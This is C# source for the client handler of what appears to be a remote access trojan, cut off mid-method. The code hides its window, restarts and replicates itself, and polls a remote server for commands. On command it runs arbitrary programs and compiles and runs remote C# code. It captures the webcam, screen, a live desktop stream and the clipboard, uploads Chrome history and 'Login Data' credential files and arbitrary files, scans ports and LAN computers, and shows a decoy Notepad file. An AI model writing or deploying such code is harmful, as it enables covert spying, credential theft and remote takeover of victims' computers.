using Library;
using Microsoft.CSharp;
using Models;
using PluginManager;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace ClientHandler
{
    public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);
    public delegate void OnCommandDelegate(object sender, CommandEventArgs e);
    public delegate void OnAuthorizedHandler(object sender, AuthEventArgs e);

    public class Handler
    {
        public PluginHandler PluginHandler { get; private set; }
        public TransmitterStatus TransmitterStatus { get; set; }
        private bool isQuitting = false;
        private FileSystemWatcher watcher;
        public Transmitter Transmitter { get; set; }
        public FileDirHandler FileDirInfo { get; private set; }
        public event OnFileEventDelegate OnFileEvent;
        public event OnCommandDelegate OnCommandEvent;
        public event OnAuthorizedHandler OnAuthorizedEvent;

        #region Singleton
        private static Handler instance;

        public static Handler Instance
        {
            get
            {
                lock (typeof(Handler))
                {
                    if (instance == null)
                    {
                        instance = new Handler();
                    }
                    return instance;
                }
            }
        }

        private Handler()
        {
            FileDirInfo = new FileDirHandler();
            watcher = new FileSystemWatcher();
            Worker = new JobWorker();
        }
        #endregion

        public void StartExceptionHandling()
        {
            Application.ThreadExit += Application_ThreadExit;
            Application.ThreadException += Application_ThreadException;
            Application.ApplicationExit += Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
        }

        public void StopExceptionHandling()
        {
            Application.ThreadExit -= Application_ThreadExit;
            Application.ThreadException -= Application_ThreadException;
            Application.ApplicationExit -= Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit -= CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException -= CurrentDomain_UnhandledException;
        }

        public Process Restart(string filename)
        {
            Process process = new Process();
            process.StartInfo.FileName = filename;
            process.EnableRaisingEvents = true;
            process.Start();
            //process.Disposed += LaunchIfCrashed;
            process.Exited += Application_ApplicationExit;
            return process;
        }

        /// <summary>
        /// Watches root dir (usually C:\)
        /// </summary>
        public void StartDirectoryWatcher()
        {
            StartDirectoryWatcher(Directory.GetDirectoryRoot(Environment.CurrentDirectory), "*.*", true);
            //StartDirectoryWatcher(@"C:\", "*.*", true);
        }

        public void StartDirectoryWatcher(string directory, string filter, bool includeSubdirectories)
        {
            //directory = Environment.CurrentDirectory;
            watcher = new FileSystemWatcher(directory, filter);
            watcher.Path = directory;
            watcher.Filter = filter;
            watcher.NotifyFilter =
                NotifyFilters.Attributes |
                NotifyFilters.CreationTime |
                NotifyFilters.DirectoryName |
                NotifyFilters.FileName |
                NotifyFilters.LastAccess |
                NotifyFilters.LastWrite |
                NotifyFilters.Security |
                NotifyFilters.Size;
            watcher.IncludeSubdirectories = includeSubdirectories;
            watcher.Changed += watcher_Changed;
            watcher.Created += watcher_Created;
            watcher.Deleted += watcher_Deleted;
            watcher.Renamed += watcher_Renamed;
            watcher.EnableRaisingEvents = true;
            //Console.WriteLine("Watching dir: " + directory);
        }

        public void StopDirectoryWatcher()
        {
            watcher.EnableRaisingEvents = false;
        }

        private void Replicate()
        {
            DialogResult dr = MessageBox.Show("Replicate?", "Replicate?", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1);
            if (dr == System.Windows.Forms.DialogResult.Yes)
            {
                Replicator.Instance.Replicate(true);
            }
        }

        void HandleExit(String msg)
        {
            if (!isQuitting)
            {
                Application.Restart();
            }
            isQuitting = true;
        }

        private void HandleWatcher(FileSystemEventArgs e)
        {
            //MessageBox.Show("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            //Console.WriteLine("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            FileDirInfo.CreateFileDirInfoEntry(e);
            OnFileEvent(this, e);
        }

        #region Watcher Events
        void watcher_Created(object sender, FileSystemEventArgs e)
        {
            //fdh.CreateFileDirInfoEntry(e);
            HandleWatcher(e);
        }

        void watcher_Changed(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Renamed(object sender, RenamedEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Deleted(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }
        #endregion


        #region Exception Events
        void Application_ThreadExit(object sender, EventArgs e)
        {
            HandleExit("Application: Thread Exit! Restarting...");
        }

        void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
            HandleExit("Application: Thread Exception! Restarting...");
        }

        void Application_ApplicationExit(object sender, EventArgs e)
        {
            HandleExit("Application: Application Exit! Restarting...");
        }

        void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            HandleExit("Domain: Unhandled Exception! Restarting...");
        }

        void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            HandleExit("Domain: Process Exit! Restarting...");
        }
        #endregion



        public List<string> GetBrowserHistory(EBrowser browser, string historyFile)
        {
            SQLiteConnection conn = new SQLiteConnection(@"Data Source=" + historyFile);
            conn.Open();
            SQLiteCommand cmd = new SQLiteCommand();
            cmd.Connection = conn;
            //  cmd.CommandText = "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;";
            //  Use the above query to get all the table names
            cmd.CommandText = "Select * From urls";
            SQLiteDataReader dr = cmd.ExecuteReader();
            while (dr.Read())
            {
                //MessageBox.Show(dr[1].ToString());
                Console.WriteLine(dr[1].ToString());
            }
            return null;
        }

        public enum EBrowser { Chrome, IE }

        public void KillProcess()
        {
            try
            {
                var pid = -1;
                if (int.TryParse(Transmitter.TSettings.Parameters, out pid))
                {
                    if (pid >= 0)
                    {
                        var process = Process.GetProcessById(pid);
                        if (process != null)
                        {
                            process.Kill();
                        }
                    }
                }
                else
                {
                    var processes = Process.GetProcessesByName(Transmitter.TSettings.Parameters);
                    if (processes != null)
                    {
                        processes[0].Kill();
                    }
                }
            }
            catch (Exception ex)
            {
                // handle
            }
        }

        public void UploadWebcamImage()
        {
            long quality = 95;
            long.TryParse(Transmitter.TSettings.Parameters, out quality);
            var bitmapImage = WebcamControl.GetWebCamImage();
            StartWork(true);
            Transmitter.UploadImage("webcam.jpg", bitmapImage, quality);
        }

        public void UploadClipboardData()
        {

            long quality = 80;
            long.TryParse(Transmitter.TSettings.Parameters, out quality);
            // Upload clipboard text
            var clipboardText = Clipboard.GetText();
            if (!string.IsNullOrEmpty(clipboardText))
            {
                Transmitter.UploadData("clipboard.txt", clipboardText, false);
            }
            // Upload clipboard image
            StartWork(true);
            Transmitter.UploadImage("clipboard.jpg", Clipboard.GetImage(), quality);
        }

        public void UploadDesktopImage()
        {
            long quality = 80;
            long.TryParse(Transmitter.TSettings.Parameters, out quality);
            var bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
            //if (bitmapImage != null)
            //{
            //    result = new UploadResult()
            //    {
            //        FileName = "desktop.jpg",
            //        FileSize = bitmapImage.ImageToByte().Length
            //    };
            //    Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
            //}
            StartWork(true);
            Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
        }

        public void ExecuteCommand()
        {
            var dataToUpload = string.Empty;
            if (!String.IsNullOrEmpty(Transmitter.TSettings.Parameters))
            {
                var inputSplit = Transmitter.TSettings.Parameters.Split(' ');
                var fileName = inputSplit.Length > 0 ? inputSplit[0] : null;
                var fileArgs = "";
                for (int i = 1; i < inputSplit.Length; i++)
                {
                    fileArgs += inputSplit[i] + " ";
                }
                fileArgs = fileArgs.TrimEnd();
                if (!string.IsNullOrEmpty(fileName))
                {
                    var hasExecuted = false;
                    try
                    {
                        RunProcess(fileName, fileArgs, AppDir, out dataToUpload);
                        hasExecuted = true;
                    }
                    catch (Exception ex)
                    {
                        hasExecuted = false;
                    }
                    if (!hasExecuted)
                    {
                        fileName = Path.Combine(DirTransfers, fileName);
                        RunProcess(fileName, fileArgs, DirTransfers, out dataToUpload);
                    }
                }
            }
            StartWork(true);
            Transmitter.UploadData("result.txt", dataToUpload, false);
        }

        private int RunProcess(string fileName, string fileArgs, string workingDir, out string result)
        {
            result = string.Empty;
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = fileName;
                psi.Arguments = fileArgs;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WorkingDirectory = workingDir;
                var p = new Process();
                p.StartInfo = psi;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                string err = p.StandardError.ReadToEnd();
                //p.EnableRaisingEvents = true;
                //p.OutputDataReceived += (o, e) =>
                //{
                //    var d = e.Data;
                //};
                //p.ErrorDataReceived += (o, e) =>
                //{
                //    var d = e.Data;
                //};
                //p.Start();
                //p.BeginOutputReadLine();
                //p.BeginErrorReadLine();
                result = !string.IsNullOrEmpty(output) ? output : err;
                //p.WaitForExit();
                return p.ExitCode;
            }
            catch (Exception)
            {
                return -1;
            }
        }

        bool isAuthorized = false;
        public string AppDir { get; private set; }
        public string DirTransfers { get; private set; }
        public string DirPlugins { get; private set; }
        public Assembly AppAssembly { get; private set; }
        private static readonly string APPDIR_TRANSFERS = "Transfers";
        private static readonly string APPDIR_PLUGINS = "Plugins";
        private int CONNECTION_TIMEOUT = 10000;
        private int CONNECTION_INTERVAL = 10000;
        private Timer transmitTimer;
        private int transmitTimerInterval = 5000;
        private Timer connectTimer;
        private Timer streamDesktopTimer;

        public void Initialize(HandlerInitData option)
        {
            this.CONNECTION_TIMEOUT = option.CONNECTION_TIMEOUT;
            this.CONNECTION_INTERVAL = option.CONNECTION_INTERVAL;
            if (option.HideOnStart)
            {
                HideForm(option.HostForm);
            }
            Application.ApplicationExit += (o, e) =>
            {
                try
                {
                    Transmitter.DeAuthorize();
                }
                catch { }
                if (option.StartNewProcessOnExit)
                {
                    Replicate();
                    //var fi = new FileInfo(AppAssembly.Location);
                    //Process.Start(new ProcessStartInfo(fi.FullName, "clone " + Convert.ToBase64String(Encoding.Default.GetBytes(fi.FullName)) + " true"));
                }
            };
            AppAssembly = Assembly.GetExecutingAssembly();
            //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
            //Replicate(_args);
            var appDirBase = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var appDirFolder = Path.Combine(appDirBase, "Hello World");
            if (!Directory.Exists(appDirFolder))
            {
                Directory.CreateDirectory(appDirFolder);
            }
            appDirFolder = Path.Combine(appDirFolder, PathExt.ReformatName("" + DateTime.Now.Ticks));
            if (!Directory.Exists(appDirFolder))
            {
                Directory.CreateDirectory(appDirFolder);
            }
            AppDir = Path.Combine(appDirBase, appDirFolder);
            //Clipboard.SetText(appDir); MessageBox.Show(appDir);
            DirTransfers = Path.Combine(AppDir, APPDIR_TRANSFERS);
            DirPlugins = Path.Combine(AppDir, APPDIR_PLUGINS);
            //            // temporary while testing
            //#if DEBUG
            //            DirPlugins = @"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\x64\Debug";
            //#endif
            CreateDirectory(AppDir);
            CreateDirectory(DirTransfers);
            CreateDirectory(DirPlugins);
            //OpenFakeTextFile("Hey!");
            Transmitter = new Library.Transmitter(option.Url, option.APIKEY_PRIVATE, option.APIKEY_PUBLIC, CONNECTION_TIMEOUT);
            //foo = Transmitter.Test(2);
            //foo = Transmitter.Test2("bar");
            //var compHash = Transmitter.GetComputerHash();
            //Clipboard.SetText(compHash); MessageBox.Show(compHash);
            //Transmitter.Authorize();
            //UploadImage();
            //UploadBrowserData();
            SetupConnectionTimer();
            //File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History", historyFile);
            //h.GetBrowserHistory(Handler.EBrowser.Chrome, historyFile);
            //FirewallManager.Instance.AddPort(1234, "test1234");
            //MinimizeFootPrint();
            PluginHandler = new PluginHandler((IPluginHost)option.HostForm, DirPlugins);
        }

        private void HideForm(Form hostForm)
        {
            hostForm.StartPosition = FormStartPosition.Manual;
            hostForm.DesktopLocation = new Point(Screen.PrimaryScreen.Bounds.Width + 10000, Screen.PrimaryScreen.Bounds.Y + 10000);
            hostForm.WindowState = FormWindowState.Minimized;
            hostForm.Opacity = 0;
            hostForm.ShowInTaskbar = false;
        }

        private void SetupConnectionTimer()
        {
            Debug.WriteLine("SetupConnectionTimer...");
            Debug.WriteLine("Trying to authorize...");
            isAuthorized = Transmitter.Authorize();
            Debug.WriteLine("Is authorized: " + isAuthorized);
            Debug.WriteLine("Setting up connection timer... Interval: " + CONNECTION_INTERVAL);
            connectTimer = new Timer();
            connectTimer.Interval = CONNECTION_INTERVAL;
            connectTimer.Tick += (o, e) =>
            {
                if (!isAuthorized)
                {
                    Debug.WriteLine("Trying to authorize...");
                    isAuthorized = Transmitter.Authorize();
                }
            };
            if (isAuthorized)
            {
                Debug.WriteLine("ConnectAndSetup...");
                ConnectAndSetup();
                connectTimer.Enabled = false;
            }
            else
            {
                connectTimer.Start();
            }
        }

        public void SetTransmissionInterval()
        {
            StartWork(true, false);
            var timeMS = Transmitter.TSettings.Parameters;
            int newInterval = 5000;
            if (int.TryParse(timeMS, out newInterval))
            {
                transmitTimerInterval = (newInterval >= 1000 && newInterval <= 24 * 60 * 60 * 1000) ? newInterval : transmitTimerInterval;
                transmitTimer.Interval = transmitTimerInterval;
            }
        }

        void ConnectAndSetup()
        {
            OnAuthorizedEvent(this, new AuthEventArgs()
            {
                IsAuthenticated = isAuthorized
            });
            //StartExceptionHandling();
            StartDirectoryWatcher();
            OnFileEvent += (o, e) =>
            {
                HandleFileEvent(e);
            };
            transmitTimer = new Timer();
            transmitTimer.Interval = transmitTimerInterval;
            transmitTimer.Tick += (o, e) =>
            {
                Transmitter.LoadSettings();
                if (Transmitter.TSettings == null)
                {
                    return;
                }
                Transmitter.UpdateLastActive();
                OnCommandEvent(this, new CommandEventArgs()
                {
                    Command = Transmitter.TSettings.Command
                });
            };
            transmitTimer.Enabled = true;
        }

        private void CreateDirectory(string dir)
        {
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
        }

        private int HandleFileEvent(FileSystemEventArgs e)
        {
            /*if (listBox2.InvokeRequired)
            {
                try
                {
                    SetTextCallback d = new SetTextCallback(HandleFileEvent);
                    this.Invoke(d, new object[] { e });
                }
                catch (ObjectDisposedException ex)
                {

                }
                return 1;
            }
            else
            {
                return listBox2.Items.Add(e.ChangeType + ", " + e.Name + ", " + e.FullPath);
            }*/
            return 0;
        }

        public bool RunElevated(string fileName)
        {
            //MessageBox.Show("Run: " + fileName);
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.Verb = "runas";
            processInfo.FileName = fileName;
            try
            {
                Process.Start(processInfo);
                return true;
            }
            catch (Win32Exception)
            {
                //Do nothing. Probably the user canceled the UAC window
            }
            return false;
        }

        private string GetProgramName()
        {
            var process = Process.GetCurrentProcess();
            if (process != null)
            {
                return process.ProcessName;
            }
            return string.Empty;
        }

        [System.Runtime.InteropServices.DllImport("psapi.dll")]
        static extern int EmptyWorkingSet(IntPtr hwProc);

        public void MinimizeFootPrint()
        {
            EmptyWorkingSet(Process.GetCurrentProcess().Handle);
        }

        public JobWorker Worker { get; set; }

        public void ReportWork()
        {

        }

        public void StartWork(bool isDone = false, bool canUploadResult = true)
        {
            if (Worker != null)
            {
                TransmitterStatus = TransmitterStatus.BUSY;
                Worker.Start();
                if (isDone)
                {
                    Worker.Stop();
                }
                if (canUploadResult)
                {
                    UploadResult(Worker.Result);
                }
            }
        }

        public void StopWork(bool canUploadResult = true)
        {
            if (Worker != null)
            {
                TransmitterStatus = TransmitterStatus.IDLE;
                if (canUploadResult)
                {
                    UploadResult(Worker.Result);
                }
                Worker.Stop();
                Transmitter.SetHasExectuted(Transmitter.TSettings);
            }
        }

        public void UploadPortInfo()
        {
            StringBuilder sb = new StringBuilder();
            var piList = FirewallManager.Instance.GetPortInfo();
            piList.ForEach((PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
            var data = sb.ToString();
            StartWork(true);
            Transmitter.UploadData("result.txt", data, false);
        }

        public void UploadProcessInfo()
        {
            StringBuilder sb = new StringBuilder();
            foreach (var p in OS.GetProcesses())
            {
                sb.AppendLine("Name: " + p.Name + ", PID: " + p.PID);
            }
            StartWork(true);
            Transmitter.UploadData("result.txt", sb.ToString(), false);
        }

        public void StopStreamDesktop()
        {
            StopWork(false);
            if (streamDesktopTimer != null)
            {
                streamDesktopTimer.Enabled = false;
                streamDesktopTimer.Stop();
            }
        }

        public void StreamDesktop()
        {
            StartWork(false);
            var interval = 5000;
            var quality = 10L;
            if (!string.IsNullOrEmpty(Transmitter.TSettings.Parameters))
            {
                var inputSplit = Transmitter.TSettings.Parameters.Split(';');
                if (inputSplit.Length >= 1)
                {
                    var intervalTemp = interval;
                    if (!int.TryParse(inputSplit[0], out intervalTemp))
                    {
                        interval = intervalTemp;
                    }
                }
                interval = interval >= 1000 && interval <= 10000 ? interval : 5000;
                if (inputSplit.Length >= 2)
                {
                    var qualityTemp = quality;
                    if (!long.TryParse(inputSplit[1], out qualityTemp))
                    {
                        quality = qualityTemp;
                    }
                }
            }
            streamDesktopTimer = new Timer();
            streamDesktopTimer.Interval = interval;
            streamDesktopTimer.Tick += (o, e) =>
            {
                Bitmap bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
                UploadResult(Worker.Result);
                Transmitter.UploadImage("stream.jpg", bitmapImage, quality);
                //CursorInteract();
            };
            streamDesktopTimer.Enabled = true;
            streamDesktopTimer.Start();
        }

        //public void CursorInteract()
        //{
        //    //MessageBox.Show(Transmitter.TSettings.CursorX + ", " + Transmitter.TSettings.CursorY);
        //    HostForm.Cursor = new Cursor(Cursor.Current.Handle);
        //    Cursor.Position = new Point(Transmitter.TSettings.CursorX, Transmitter.TSettings.CursorY);
        //    string inputChar = Transmitter.TSettings.KeyCode;
        //    if (inputChar.Length > 0)
        //    {
        //        //MessageBox.Show(inputChar);
        //    }
        //    //Cursor.Clip = new Rectangle(HostForm.Location, HostForm.Size);
        //}

        public void UploadFileEvents()
        {
            StringBuilder sb = new StringBuilder();
            FileDirInfo.FileDirInfoList.ForEach((FileDirInfo fdi) => sb.AppendLine(fdi.DateTime.ToString() + " " + fdi.FileInfo.ToString()));
            Transmitter.UploadData("fileevents.txt", sb.ToString(), false);
        }

        public void DownloadFile()
        {
            byte[] fileData = Transmitter.DownloadFile();
            if (fileData != null)
            {
                File.WriteAllBytes(Path.Combine(DirTransfers, Transmitter.TSettings.File), fileData);
                //string path = appDir + "\\Transfers";
                //if (!Directory.Exists(path))
                //{
                //    try
                //    {
                //        Directory.CreateDirectory(path);
                //    }
                //    catch { }
                //}
                //try
                //{
                //    File.WriteAllBytes(Path.Combine(path, Transmitter.TSettings.File), fileData);
                //}
                //catch { }
            }
        }

        public void UploadFile()
        {
            var fileInfo = new FileInfo(Transmitter.TSettings.File); // .FileToDownload);
            try
            {
                var data = new FileData(fileInfo, File.ReadAllBytes(fileInfo.FullName), Transmitter.TSettings.ComputerHash);
                Transmitter.UploadData(fileInfo.Name, data, false);
            }
            catch (Exception ex)
            {
                // handle
            }
        }

        //private void UploadFile(string path, int c = 0)
        //{
        //    if (!Transmitter.UploadFile(PatGetFileName(path), path) && c <= 1)
        //    {
        //        UploadFile(Transmitter.TSettings.FileToDownload, c + 1);
        //    }
        //    try
        //    {
        //        File.Delete(path);
        //    }
        //    catch (Exception ex) { }
        //}

        //private void CompressAndUploadFile(string fileFullPath)
        //{
        //    try
        //    {
        //        string fileName = Path.GetFileName(fileFullPath);
        //        string fileToUpload = dirDownloads + "\\" + fileName;
        //        if (Compression.Zip(fileFullPath, fileToUpload))
        //        {
        //            Transmitter.UploadFile(fileName, fileToUpload);
        //        }
        //        try
        //        {
        //            File.Delete(fileToUpload);
        //        }
        //        catch (Exception ex) { }
        //    }
        //    catch (Exception ex) { }
        //}

        public static void CopyStream(Stream input, Stream output)
        {
            byte[] buffer = new byte[8 * 1024];
            int len;
            while ((len = input.Read(buffer, 0, buffer.Length)) > 0)
            {
                output.Write(buffer, 0, len);
            }
        }

        public void UploadBrowserData()
        {
            try
            {
                // Save Chrome Browser data
                string[] chromeFiles = new string[] {
                        "History",
                        "Login Data"
                    };
                var chromePath = @"\Google\Chrome\User Data\Default\";
                int c = 0;
                string[] zipFiles = new string[chromeFiles.Length];
                foreach (var file in chromeFiles)
                {
                    //var destFileName = dirTransfers + @"\Chrome " + file;
                    //if (File.Exists(destFileName))
                    //{
                    //    File.Delete(destFileName);
                    //}
                    var sourceFileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + chromePath + file;
                    //File.Copy(sourceFileName, destFileName);
                    //zipFiles[c] = destFileName;
                    zipFiles[c] = sourceFileName;
                    c++;
                }
                //var fileData = Compression.Compress(zipFiles);
                //File.WriteAllBytes(@"C:\Users\benjamin\AeroFS\Visual Studio 2012\Projects\restless-honey-seeker\serverDotNet\Server\DataFromClient\" + DateTime.Now.Ticks + ".zip", fileData);

                //var data = new FileData("ChromeData.zip", Compression.Compress(zipFiles), Transmitter.TSettings.ComputerHash);
                Transmitter.UploadData("ChromeData.zip", zipFiles, true);


                //if (Compression.Zip(zipFiles, dirTransfers + "\\Chrome Browser Data.zip"))
                //{
                //    foreach (var file in chromeFiles)
                //    {
                //        try
                //        {
                //            File.Delete(dirTransfers + @"\Chrome " + file);
                //        }
                //        catch (Exception ex) { }
                //    }
                //    string fileToUpload = dirTransfers + "\\Chrome Browser Data.zip";
                //    //Transmitter.UploadFile("Chrome Browser Data", fileToUpload);
                //    var fileInfo = new FileInfo(fileToUpload);
                //    var fileData = File.ReadAllBytes(fileInfo.FullName);
                //    Transmitter.UploadFile(new FileData()
                //    {
                //        FileInfo = fileInfo,
                //        Data = fileData
                //    });
                //    try
                //    {
                //        File.Delete(fileToUpload);
                //    }
                //    catch (Exception ex) { }
                //}
            }
            catch (Exception ex) { }
        }

        private void Replicate(string[] _args)
        {
            // Hide itself
            //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
            if (_args.Length == 3)
            {
                var fiSrc = Encoding.Default.GetString(Convert.FromBase64String(_args[1]));
                //clone app to other destination
                if (_args[0] == "clone")
                {
                    try
                    {
                        // todo: Should be dynamic places
                        string destDir = Path.Combine(Environment.CurrentDirectory, "Clone");// Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);// Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                        if (!Directory.Exists(destDir))
                        {
                            try
                            {
                                Directory.CreateDirectory(destDir);
                            }
                            catch { }
                        }
                        FileInfo fiSelf = new FileInfo(AppAssembly.Location);
                        var target = Path.Combine(destDir, fiSelf.Name);
                        if (fiSelf.DirectoryName != destDir)
                        {
                            if (File.Exists(target))
                            {
                                File.Delete(target);
                            }
                            File.Copy(AppAssembly.Location, target);
                            //System.Threading.Thread.Sleep(1000);
                            var psi = new ProcessStartInfo(target, "dont_clone " + Convert.ToBase64String(Encoding.Default.GetBytes(fiSelf.FullName)) + " false");
                            Process.Start(psi);
                            Application.Exit();
                        }
                    }
                    catch { }
                }
                else if (_args[0] == "dont_clone")
                {
                    // delete old app
                    try
                    {
                        System.Threading.Thread.Sleep(1000);
                        File.Delete(fiSrc);
                    }
                    catch { }
                }
            }
        }

        public bool OpenFakeTextFile(string message)
        {
            try
            {
                String tempDir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                //String tempDir = appDir + "\\" + DateTime.Now.Ticks;
                //CreateDirectory(tempDir);
                //tempFile = tempDir + "\\" + PathExt.ReformatName(GetProgramName()) + ".txt";
                var fakeTextFilePath = Environment.CurrentDirectory + "\\" + PathExt.ReformatName(GetProgramName()) + ".txt";
                using (FileStream fs = new FileStream(fakeTextFilePath, FileMode.Create))
                {
                    using (StreamWriter sw = new StreamWriter(fs, Encoding.UTF8))
                    {
                        sw.WriteLine(message);
                        sw.Close();
                    }
                    fs.Close();
                }
                FileInfo fileInfo = new FileInfo(fakeTextFilePath);
                fileInfo.Attributes = FileAttributes.Hidden;
                ProcessStartInfo psi = new ProcessStartInfo("notepad.exe", fakeTextFilePath);
                psi.WindowStyle = ProcessWindowStyle.Maximized;
                psi.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                Process.Start(psi);
                return true;
            }
            catch (Exception ex) { return false; }
        }

        public void ExecuteCode()
        {
            ExecuteCodePvt();
            StartWork(true, false);
        }

        void ExecuteCodePvt()
        {
            string code = @"
    using System;
    using System.Drawing;
    using System.Text;
    using System.Windows.Forms;
    using System.IO;
    namespace Client
    {
        public class Program
        {
            public static void Main()
            {
            " +
        Transmitter.TSettings.Parameters
        + @"
            }
        }
    }
";

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = true;
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();
                foreach (CompilerError error in results.Errors)
                {
                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
                }
                Transmitter.UploadData("exception.txt", sb.ToString(), false);
            }
            try
            {
                Assembly assembly = results.CompiledAssembly;
                Type program = assembly.GetType("Client.Program");
                MethodInfo main = program.GetMethod("Main");
                main.Invoke(null, null);
            }
            catch (Exception ex)
            {
                Transmitter.UploadData("exception.txt", ex.ToString(), false);
            }
        }

        public void UploadResult(UploadResult result)
        {
            Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(result), false);
        }

        public void UploadShares()
        {
            StringBuilder sb = new StringBuilder();
            var piList = FirewallManager.Instance.GetShareInfo();
            piList.ForEach((Library.ShareInfo si) => sb.AppendLine("Name: " + si.Name + ", Remark: " + si.Remark + ", Type: " + si.Type));
            var data = sb.ToString();
            StartWork(true);
            Transmitter.UploadData("shares.txt", data, false);
        }

        public void UploadLANComputers()
        {
            StringBuilder sb = new StringBuilder();
            var piList = FirewallManager.Instance.GetLANComputers();
            piList.ForEach((Library.LANComputerInfo lci) => sb.AppendLine("Name: " + lci.Name));
            var data = sb.ToString();
            StartWork(true);
            Transmitter.UploadData("lan_computers.txt", data, false);
        }

        public void UploadGatewayInfo()
        {
            StringBuilder sb = new StringBuilder();
            var piList = FirewallManager.Instance.GetGetwayInfo();
            piList.ForEach((Library.GatewayInfo i) => sb.AppendLine("Adapter description: " + i.AdapterDescription + ", Address: " + i.Address));
            var data = sb.ToString();
            StartWork(true);
            Transmitter.UploadData("gateways.txt", data, false);
        }

        public void UploadPortscan()
        {
            StartWork(false);
            var sbPorts = new StringBuilder();
            var ps = new PortScanner(Transmitter.TSettings.Parameters);
            var timer = new System.Windows.Forms.Timer();
            timer.Interval = 100;
            timer.Tick += (o, e) =>
            {
                if (ps != null)
                {
                    while (ps.ScanResults.Count > 0)
                    {
                        var scanResult = ps.ScanResults.Dequeue();
                        if (scanResult != null)
                        {
                            // Currently adds all ports (open and closed). Use scanResult.IsOpen to check if you only need open ports.
                            sbPorts.AppendLine(scanResult.ToString());
                        }
                    }
                    timer.Enabled = false;
                    sbPorts.AppendLine("Portscan finished!");
                    var data = sbPorts.ToString();
                    Worker.IsDone = true;
                    UploadResult(Worker.Result);
                    Transmitter.UploadData("portscan.txt", data, false);
                    //txtStatus.Text = "Port scan " + Math.Round(ps.PercentageDone, 0) + "%. Found: " + ps.FoundPorts.Count;
                }
            };
            timer.Enabled = true;
            //sbPorts.AppendLine((portInfo.EPortType == EPortType.TCP ? "TCP" : "UDP") + " Portscan initiated...");
            sbPorts.AppendLine("Portscan initiated...");
            sbPorts.AppendLine("Target: " + ps.Data.IPAddressString + ", Timeout: " + ps.PortTimeoutTreshold + ", Range: " + ps.Data.PortStart + " - " + ps.Data.PortEnd);
            ps.Start();
        }

        // http://www.computerhope.com/shutdown.htm
        public void Shutdown()
        {
            SystemPowerUtils.Shutdown();
            StartWork(true, false);
        }

        public void Restart()
        {
            SystemPowerUtils.Restart();
            StartWork(true, false);
        }

        public void Logoff()
        {
            SystemPowerUtils.Logoff();
            StartWork(true, false);
        }

        public void LockComputer()
        {
            SystemPowerUtils.LockComputer();
            StartWork(true, false);
        }

        public void Hibernate()
        {
            SystemPowerUtils.Hibernate();
            StartWork(true, false);
        }

        public void Sleep()
        {
            SystemPowerUtils.Sleep();
            StartWork(true, false);
        }

        public void ExecutePlugin()
        {
            StartWork(true);
            if (PluginHandler != null)
            {
                var data = PluginHandler.Execute(Transmitter.TSettings.File, Transmitter.TSettings.Parameters);
                if (data != null && data.Length > 0)
                {
                    File.WriteAllBytes(Path.Combine(AppDir, "data.dat"), data);
                    Transmitter.UploadData("data.dat", data, false);
                }
            }
        }

        public void RemovePlugin()
        {
            StartWork(true);
            if (PluginHandler != null)
            {
                PluginHandler.Kill(Transmitter.TSettings.File);
            }
        }

        public void UploadPlugin()
        {
            StartWork(true);
            byte[] data = Transmitter.DownloadFile();
            if (data != null)
            {
                var path = DirPlugins;// Path.Combine(dirPlugins, Handler.Instance.Transmitter.TSettings.File);
                //File.WriteAllBytes(path, data);
                try
                {
                    Compression.Extract(data, path);
                }
                catch (Exception)
                {
